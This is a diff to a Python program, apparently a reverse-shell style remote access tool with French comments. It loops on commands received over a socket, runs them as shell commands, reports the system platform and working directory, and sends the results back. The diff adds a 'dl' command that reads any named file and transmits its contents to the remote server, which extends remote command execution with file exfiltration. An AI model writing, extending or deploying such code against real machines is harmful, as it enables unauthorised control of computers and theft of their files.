@@ -32,6 +32,7 @@ while True:
     commande_split = command.split(" ")        
     if command == "infos":
         response = platform.platform() + " " + os.getcwd()
+        response = response.encode()
     # handles not directory    
     elif len(commande_split) == 2 and commande_split[0] == "cd":
         try:
@@ -40,24 +41,31 @@ while True:
             response = " "
         except FileNotFoundError:
             response = "ERREUR : ce répertoire n'exite pas"
+        response = response.encode()
+    # handles case download file client to server
+    elif len(commande_split) == 2 and commande_split[0] == "dl":
+        # rb = read binary
+        try:
+            f = open(commande_split[1], "rb")
+        except FileNotFoundError:
+            response = " ".encode()
+        else:
+            response = f.read()
+            f.close()
     else:
-        response = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
-        response = response.stdout + response.stderr
+        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
+        response = result.stdout + result.stderr
         if not response or len(response) == 0:
             response = " "
+        response = response.encode()
            
-    # handles too long command: 
-    # HEADER 13 octets -> len data
-    # DATA (len) octets 
-
-    # ex : HEADER 0000000002024
-    #      DATA (2024) octets
-    data_len = len(response.encode())
+    # handles too long command: HEADER 13 octets | DATA (len) octets / ex : HEADER 0000000002024 | DATA (2024) octets
+    # response is already encode
+    data_len = len(response)
     header = str(data_len).zfill(13)
     print(f'HEADER : {header}')
     s.sendall(header.encode())
     if data_len > 0:
-        s.sendall(response.encode())
-
+        s.sendall(response)
 
 s.close()
